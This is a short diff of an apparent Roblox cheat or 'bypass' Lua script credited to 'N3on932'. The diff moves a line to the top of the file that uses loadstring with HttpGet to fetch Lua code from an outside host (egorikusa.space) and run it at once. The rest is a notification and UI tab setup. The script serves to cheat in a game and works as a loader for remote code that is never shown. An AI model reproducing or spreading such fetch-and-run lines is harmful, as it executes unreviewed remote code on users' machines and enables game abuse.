@@ -1,3 +1,6 @@
+getgenv().gui = false
+loadstring(game:HttpGet("https://egorikusa.space/d01cb5ebe423840d74f01a2b.lua", true))()
+
 game:GetService("StarterGui"):SetCore("SendNotification", { 
         Title = "Activate Bypass!";
         Text = "N3on932 on TOP";
@@ -126,6 +129,3 @@ end)
 
 --//tab
 local Tab = Window.NewTab("Script Made By N3on932")
-
-getgenv().gui = false
-loadstring(game:HttpGet("https://egorikusa.space/d01cb5ebe423840d74f01a2b.lua", true))()
